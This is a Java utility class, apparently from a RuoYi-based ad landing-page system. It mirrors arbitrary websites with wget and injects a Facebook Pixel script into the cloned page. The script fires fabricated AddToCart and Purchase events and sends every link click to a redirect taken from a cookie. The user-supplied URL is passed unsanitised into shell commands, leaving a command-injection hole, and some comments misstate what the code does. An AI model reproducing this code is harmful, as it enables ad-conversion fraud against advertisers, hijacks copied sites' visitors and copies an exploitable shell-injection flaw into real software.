package com.ruoyi.common.utils.file;

import com.alibaba.fastjson2.JSON;
import com.alibaba.fastjson2.JSONObject;
import org.apache.commons.io.IOExceptionList;
import org.springframework.stereotype.Component;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.io.InputStreamReader;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static com.ruoyi.common.constant.Constants.*;
import static org.apache.commons.io.IOUtils.close;

/**
 * @author LinE
 * 落地页操作类
 * <p>
 * www 为落地页域名
 * domain 为投手的配置落地页文件路径
 */
@Component
public class LandPageUtils {

    /**
     * 增加落地页面
     *
     * @param url 需要下载的网站URL 注意：需要是浏览器地址栏下复制的地址，在链接地址的末尾有 `/`
     * @return 返回用户此次增加的落地链接
     */
    public String downloadWebsite(String url) throws IOException {
        String savePath = createUniqueDirectory(PUBLIC_DATA, "");
        String command = "wget -P " + savePath + " -c -r -e robots=off -nv -p -k -nH --cut-dirs=1" + url; // 构建wget命令
        System.out.println(command);
        System.out.println(shellCommandExecutor(command));
        String commandImg = "wget 'https://urlscan.io/liveshot/?width=240&height=" + new int[]{480, 580, 920, 620, 720, 860}[new Random().nextInt(6)] + "&url=" + url + "' -O " + savePath + "/saved_image.jpg";
        System.out.println(shellCommandExecutor(commandImg));
        System.out.println(commandImg);
        String fileUrl = scanFolderHtml(savePath, null, false).get(0);
        String jsCode = "<script defer>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');function getCookie(name){let nameEQ=name+\"=\";let ca=document.cookie.split(';');for(let i=0;i<ca.length;i++){let c=ca[i];while (c.charAt(0) === ' ') c = c.substring(1);if(c.indexOf(nameEQ)===0)if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length, c.length));}return null}JSON.parse(getCookie(\"xsid\")).forEach(v=>{console.log(v);console.log(typeof v);fbq('init',v);fbq('track','PageView');console.log(\"fbq\")});function fmk(){fbq('track','AddToCart');fbq('track','Purchase',{value:'10',currency:'USD'});console.log(\"fmk\")}function replaceUrlForYou(){fmk();setTimeout(()=>{window.location.replace(getCookie('link'))},200)}</script>";
        replaceUrlsInHtmlFile(fileUrl, jsCode);
        setPermissions(Paths.get(savePath).toFile());
        List<String> ls = scanFolderHtml(savePath, null, true);
        if (ls.size() == 0) {
            return null;
        }
        return ls.get(0);
    }


    /**
     * 增加用户配置页
     *
     * @return 返回用户此次增加的落地链接
     */
    public String configPageAdd(String username) throws IOExceptionList {
        String savePath = createUniqueDirectory(USER_DATA, username);
        String command = "cp -r " + TEST_USER + " " + savePath; //复制用户配置模板文件
        // 调用一个自定义的方法，设置目录的权限
        setPermissions(Paths.get(savePath).toFile());
        System.out.println("\n" + command + "\n");
        System.out.println(shellCommandExecutor(command));
        List<String> ls = scanFolderHtml(savePath, null, true);
        if (ls.size() == 0) {
            return null;
        }
        return ls.get(0);
    }


    /**
     * 生成一个唯一的目录名，使用URL安全的Base64编码和时间戳
     * 创建一个唯一的目录名并在文件系统中创建该目录。
     *
     * @param basePath 基础路径，新目录将在此路径下创建。
     * @return 创建的目录的绝对路径，如果创建失败则返回null。
     */
    // 定义一个公共的方法，返回一个字符串类型的值
    public String createUniqueDirectory(String basePath, String username) {
        // 创建一个安全的随机数生成器
        SecureRandom random = new SecureRandom();
        // 创建一个长度为2的字节数组
        byte[] bytes = new byte[2];
        // 用随机数生成器填充字节数组
        random.nextBytes(bytes);
        // 使用 Base64 编码器将字节数组转换为一个不带填充的 URL 安全的字符串
        // 一个随机的新目录名
        // 将 Base64 编码的字符串和当前的毫秒数拼接起来，形成一个唯一的字符串
        String dirName = Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
        // 如果用户名不为空，就将用户名也拼接到目录名后面
        if (!username.isEmpty()) {
            dirName = dirName + username;
        }
        dirName += System.currentTimeMillis();
        // 创建一个 File 对象，表示要创建的目录，参数是基础路径和目录名
        File directory = new File(basePath, dirName);
        // 如果目录不存在，并且成功创建了目录，就执行以下操作
        if (!directory.exists() && directory.mkdirs()) {
            // 返回目录的绝对路径
            setPermissions(directory);
            System.out.println(directory);
            return directory.getAbsolutePath();
        }
        // 否则，返回 null
        return null;
    }


    /**
     * 执行命令方法
     *
     * @param command linux 命令
     * @return 退出码
     */
    public int shellCommandExecutor(String command) {
        ProcessBuilder builder = new ProcessBuilder();
        builder.command("sh", "-c", command);
        builder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        builder.redirectError(ProcessBuilder.Redirect.INHERIT);
        int exitCode = -1;

        try {
            Process process = builder.start();
            exitCode = process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }

        return exitCode;
    }


    /**
     * 展示的落地页扫描
     *
     * @param folderPath 扫描路径
     * @return 路径下包含落地页的文件列表
     */
    public List<String> scanFolderHtml(String folderPath, String username, boolean isUrl) throws IOExceptionList {
        try (Stream<Path> paths = Files.walk(Paths.get(folderPath))) {
            return paths.filter(Files::isRegularFile).filter(path -> path.getFileName().toString().contains("index.html")).filter(path -> isValidPath(path, username)).map(path -> isUrl ? convertToUrl(path) : path.toString()).collect(Collectors.toList());
        } catch (IOException e) {
            e.printStackTrace();
            return Collections.emptyList();
        } finally {
            close();
        }
    }

    /**
     * username为空不包含，不为空只扫描包含username的路径
     *
     * @param path     该目录下所有路径
     * @param username username
     * @return 一次过滤的路径
     */
    private boolean isValidPath(Path path, String username) {
        String pathStr = path.toString();
        // 如果 username 为空或者 pathStr 包含 username，则返回 true
        return (username == null || username.isEmpty() || pathStr.contains(username));
    }

    /**
     * 去除文件路径中的部分字符，转成url
     *
     * @param path 过滤后的文件路径
     * @return url
     */
    public String convertToUrl(Path path) {
        // .replace("_80", "").replace("/wwwroot", "")
        return "https://" + path.toString().replace("/opt/1panel/apps/openresty/openresty/www/sites/", "").replace("index.html", "").replace("/index", "").replace(File.separator, "/");
    }

    /**
     * 设置目录权限为777
     *
     * @param directory 文件
     */
    private void setPermissions(File directory) {
        try {
            // 使用Runtime执行chmod命令
            ProcessBuilder builder = new ProcessBuilder("chmod", "-R", "775", directory.getAbsolutePath());
            Process process = builder.start();
            process.waitFor();
            System.out.println("Directory permissions set to 775");
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    /**
     * 下载落地页时修改页面中a标签的href属性
     * 更改任何标签中的onclick属性
     * 暂定不输出返回值
     *
     * @param filePath 下载的落地页文件路径
     * @param jsCode   简单加密的js代码
     */
    public void replaceUrlsInHtmlFile(String filePath, String jsCode) throws IOExceptionList {
        try {
            Path path = Paths.get(filePath);
            Charset charset = StandardCharsets.UTF_8;

            String content = new String(Files.readAllBytes(path), charset);
            // 替换href属性
            content = content.replaceAll("<a\\s+(?:[^>]*?\\s+)?href=\"[^\"]*\"", "<a href=\"javascript:replaceUrlForYou()\"");
            // 替换onclick属性
            content = content.replaceAll("onclick=\"[^\"]*\"", "onclick=\"replaceUrlForYou()\"");
            // 替换其他可能的URL属性
            content = content.replaceFirst("</body>", jsCode + "\n</body>");

            Files.write(path, content.getBytes(charset));
            System.out.println("URL替换完成。");
        } catch (IOException e) {
            System.err.println("下载落地页时修改页面中a标签的href属性发生错误: " + e.getMessage());
            e.printStackTrace();
        } finally {
            close();
        }
    }

    /**
     * 读取JSON文件并返回一个JSONObject
     *
     * @param filePath 文件路径
     * @return 如果文件路径为正常，返回文件路径下读取的json内容
     */
    public JSONObject readJsonFile(String filePath) throws IOExceptionList {
        try {
            // 读取文件内容为字节数组
            byte[] bytes = Files.readAllBytes(Paths.get(filePath));
            // 使用 fastjson2 的 parseObject 方法解析字节数组为 JSONObject
            // 返回 JSONObject
            return JSON.parseObject(bytes);
        } catch (Exception e) {
            System.out.println("读取JSON文件并返回一个JSONObject发生错误: " + e.getMessage());
            return null;
        } finally {
            close();
        }
    }

    /**
     * 修改JSONObject中的指定字段的值
     *
     * @param jsonObject 已读取的json内容
     * @param changes    包含要修改的字段名和值的字典
     * @return 返回新的修改后的json内容
     */
    public JSONObject modifyJson(JSONObject jsonObject, Map<String, Object> changes, String file) throws IOExceptionList {
        try {
            // 遍历修改的字段和值
            for (Map.Entry<String, Object> entry : changes.entrySet()) {
                // 获取字段名和值
                String key = entry.getKey();
                Object value = entry.getValue();
                // 使用 fastjson2 的 put 方法修改 JSONObject 中的字段值
                jsonObject.put(key, value);
            }
            // 返回修改后的 JSONObject
            Files.write(Paths.get(file), jsonObject.toJSONString().getBytes());
            return jsonObject;
        } catch (Exception e) {
            System.out.println("修改JSONObject中的指定字段的值发生错误: " + e.getMessage());
            return null;
        } finally {
            close();
        }
    }
}
